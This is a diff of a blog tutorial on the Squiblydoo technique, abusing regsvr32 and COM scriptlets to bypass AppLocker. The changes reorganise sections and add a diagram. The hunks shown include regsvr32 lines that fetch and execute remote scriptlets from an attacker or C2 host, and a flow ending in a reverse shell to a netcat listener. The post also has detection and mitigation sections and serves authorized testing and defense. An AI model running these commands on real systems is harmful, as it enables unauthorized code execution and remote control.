@@ -1,11 +1,40 @@
 ---
 title: "AppLocker Bypass: Regsvr32 (Squiblydoo)"
-date: 2026-03-06
-description: "Squiblydoo: abusing regsvr32.exe and COM scriptlets to execute arbitrary JScript or VBScript remotely and locally, bypassing AppLocker default rules with a Microsoft-signed binary."
+date: 2026-05-15
+weight: 2
+reading_path: "applocker"
+step: 2
+description: "Squiblydoo: abusing regsvr32.exe and COM scriptlets to execute arbitrary JScript or VBScript remotely and locally, bypassing AppLocker default rules."
+verified: "Windows 10/11 Enterprise · May 2026"
 tags: ["applocker", "bypass", "regsvr32", "squiblydoo", "sct", "lolbins", "evasion", "windows", "blueteam"]
 ---
 
 > **Scope:** Red team / authorized penetration testing. Technique maps to MITRE ATT&CK [T1218.010](https://attack.mitre.org/techniques/T1218/010/).
+
+---
+
+## What Is AppLocker?
+
+AppLocker is Microsoft's application whitelisting solution, available on Windows 7+ Enterprise and Ultimate SKUs. Admins define rules, by publisher, path, or file hash, that control which executables, scripts, installers, and DLLs are allowed to run.
+
+On paper it's a solid defense. In practice, it ships with a fundamental blind spot: **signed Microsoft binaries are trusted by default**. That trust is exactly what this technique exploits.
+
+---
+
+## Why Does Regsvr32 Bypass AppLocker?
+
+Under AppLocker's default rules, some file types are evaluated and many are not:
+
+| Covered by default rules | Not covered |
+|---|---|
+| `.exe` `.com` | `.sct` ← **this technique** |
+| `.ps1` `.vbs` `.js` | `.hta` |
+| `.cmd` `.bat` | `.wsf` `.wsc` |
+| `.msi` `.msp` `.mst` | `.xsl` `.inf` |
+| `.dll` `.ocx` (off by default) | `.cpl` `.url` |
+| `.appx` | `.gadget` and many more |
+
+`regsvr32.exe` (a trusted binary) loads the `.sct` via `scrobj.dll` (also trusted). AppLocker only ever evaluated the two binaries, never the SCT content they pulled in.
 
 ---
 
@@ -29,7 +58,7 @@ Host Machine
         └── netcat / rlwrap (shell listener)
 ```
 
-### Windows VM — Enable AppLocker
+### Windows VM: Enable AppLocker
 
 ```powershell {linenos=inline}
 # Enable AppLocker in audit + enforce mode
@@ -81,7 +110,7 @@ Get-WinEvent -FilterHashtable @{
 } -MaxEvents 5 | Select-Object TimeCreated, Message
 ```
 
-### Attacker VM — Python SCT Server
+### Attacker VM: Python SCT Server
 
 ```bash
 # start SCT payload server on port 80
@@ -102,75 +131,18 @@ VM → Snapshot → "REGSVR32_BASELINE"
 
 ## Execution Chain Diagram
 
-``` {linenos=inline}
-ATTACKER                          VICTIM (AppLocker enforced)
-────────                          ────────────────────────────
-                                  User / existing foothold
-                                         │
-                                         │  runs:
-                                         ▼
-                           regsvr32.exe /s /n /u /i:<URL> scrobj.dll
-                                         │
-                              ┌──────────┴──────────────┐
-                              │   AppLocker evaluates   │
-                              │   regsvr32.exe          │
-                              │   ✓ Signed Microsoft    │
-                              │   ✓ Trusted publisher   │
-                              │   → ALLOW               │
-                              └──────────┬──────────────┘
-                                         │
-                                         │  WinHTTP GET
-                                         ▼
-serve.py  ◄──────────────────  fetch payload.sct
-   │
-   │  HTTP 200  text/scriptlet
-   ▼
-payload.sct ─────────────────►  scrobj.dll parses SCT
-                                         │
-                              ┌──────────┴──────────────┐
-                              │   AppLocker evaluates   │
-                              │   scrobj.dll            │
-                              │   ✓ Signed Microsoft    │
-                              │   → ALLOW               │
-                              └──────────┬──────────────┘
-                                         │
-                                         │  JScript / VBScript
-                                         ▼
-                                  <![CDATA[ ... ]]>
-                                  your code executes
-                                         │
-nc -lvnp 4444  ◄─────────────  reverse shell connects
+```mermaid
+graph TD
+    U["User / existing foothold"] --> R["regsvr32.exe /s /n /u /i:URL scrobj.dll"]
+    R --> A1{"AppLocker checks\nregsvr32.exe"}
+    A1 -->|"signed Microsoft, trusted publisher"| ALLOW1["ALLOW"]
+    ALLOW1 -->|"WinHTTP GET"| SRV["serve.py hands back\npayload.sct (HTTP 200)"]
+    SRV --> P["scrobj.dll parses the SCT"]
+    P --> A2{"AppLocker checks\nscrobj.dll"}
+    A2 -->|"signed Microsoft"| ALLOW2["ALLOW"]
+    ALLOW2 -->|"JScript / VBScript in CDATA"| EXEC["Your code executes"]
+    EXEC --> SHELL["Reverse shell to nc -lvnp 4444"]
 ```
-
----
-
-## AppLocker Rule Coverage Gap
-
-``` {linenos=inline}
-AppLocker Default Rules
-┌─────────────────────────────────────────────────────┐
-│  ✓ COVERED                   ✗ NOT COVERED          │
-│  ─────────────               ────────────────────── │
-│  .exe  .com                  .sct  ← this blog      │
-│  .ps1  .vbs  .js             .hta                   │
-│  .cmd  .bat                  .wsf  .wsc             │
-│  .msi  .msp  .mst            .xsl  .inf             │
-│  .dll  .ocx (off by default) .cpl  .url             │
-│  .appx                       .gadget                │
-│                              ...and many more       │
-└─────────────────────────────────────────────────────┘
-
-regsvr32.exe (trusted binary) loads .sct via scrobj.dll (trusted binary)
-AppLocker only evaluated the binaries — never the SCT content.
-```
-
----
-
-## What Is AppLocker?
-
-AppLocker is Microsoft's application whitelisting solution, available on Windows 7+ Enterprise and Ultimate SKUs. Admins define rules, by publisher, path, or file hash, that control which executables, scripts, installers, and DLLs are allowed to run.
-
-On paper it's a solid defense. In practice, it ships with a fundamental blind spot: **signed Microsoft binaries are trusted by default**. That trust is exactly what this technique exploits.
 
 ---
 
@@ -190,7 +162,7 @@ The technique was named **Squiblydoo** by researcher Casey Smith ([@subTee](http
 
 ---
 
-## How It Works
+## How Does the Squiblydoo Bypass Work?
 
 The magic flag is `/i:` combined with `/n` (no DllInstall) and `/u` (unregister). When you pass a URL or file path to `/i:`, regsvr32 fetches and parses a COM scriptlet and executes its registration logic, which is just script code you control.
 
@@ -232,7 +204,7 @@ AppLocker never gets a chance to evaluate the scriptlet itself. It only sees tru
 
 ---
 
-## The Scriptlet Format
+## What Is a Scriptlet (.sct) File?
 
 COM scriptlets are XML files with a `.sct` extension. The structure is straightforward:
 
@@ -260,7 +232,7 @@ COM scriptlets are XML files with a `.sct` extension. The structure is straightf
 
 ## Custom Payloads
 
-### 1. Proof of Concept — calculator pop
+### 1. Proof of Concept: calculator pop
 
 The classic "I'm in" confirmation. Pops calc.exe, no network activity, no persistence, clean PoC for client demos.
 
@@ -282,7 +254,7 @@ The classic "I'm in" confirmation. Pops calc.exe, no network activity, no persis
 
 ---
 
-### 2. Command execution — arbitrary cmd
+### 2. Command execution: arbitrary cmd
 
 Run any command silently. Swap out the command string for whatever your engagement calls for.
 
@@ -305,7 +277,7 @@ Run any command silently. Swap out the command string for whatever your engageme
 
 ---
 
-### 3. Reverse shell — PowerShell one-liner delivery
+### 3. Reverse shell: PowerShell one-liner delivery
 
 This is the one you'll actually use on engagements. The scriptlet invokes PowerShell with a base64-encoded reverse shell, window hidden, execution policy bypassed. Swap in your IP and port.
 
@@ -355,7 +327,7 @@ This is the one you'll actually use on engagements. The scriptlet invokes PowerS
 
 ### 4. Shellcode loader via scriptlet
 
-If you're dropping raw shellcode (e.g. a Cobalt Strike or Sliver stager), the scriptlet can call into a VBScript helper that writes a temporary HTA or drops a loader. Alternatively, chain into your `modern_runner` binary via a staged download:
+If you're dropping raw [shellcode](/docs/applocker/process-injection/) (e.g. a Cobalt Strike or [Sliver](/docs/tools/sliver/) stager), the scriptlet can call into a VBScript helper that writes a temporary HTA or drops a loader. Alternatively, chain into your `modern_runner` binary via a staged download:
 
 ```xml {linenos=inline}
 <?XML version="1.0"?>
@@ -447,7 +419,7 @@ python3 serve.py
 
 ## Execution
 
-### Remote (most common — no file drops)
+### Remote (most common, no file drops)
 
 ```cmd
 regsvr32 /s /n /u /i:http://10.10.10.10/revshell.sct scrobj.dll
@@ -488,7 +460,7 @@ regsvr32 /s /n /u /i:https://your.c2.domain/payload.sct scrobj.dll
 
 ## Detection (Blue Team)
 
-If you're defending against this:
+If you're [defending against this](/docs/blueteam/lolbins-hunting/):
 
 | signal | where to look |
 |--------|--------------|
@@ -510,7 +482,7 @@ If you're defending against this:
 </ProcessCreate>
 ```
 
-**Mitigation:** Software Restriction Policies or AppLocker rules that explicitly block `regsvr32.exe` from making outbound network connections, combined with blocking child process spawning from regsvr32. Windows Defender Application Control (WDAC) is more robust than AppLocker for this. It operates at the kernel level and is harder to bypass.
+**Mitigation:** Software Restriction Policies or AppLocker rules that explicitly block `regsvr32.exe` from making outbound network connections, combined with blocking child process spawning from regsvr32. [Windows Defender](/docs/redteam/defender-bypass/) Application Control (WDAC) is more robust than AppLocker for this. It operates at the kernel level and is harder to bypass.
 
 ---
 
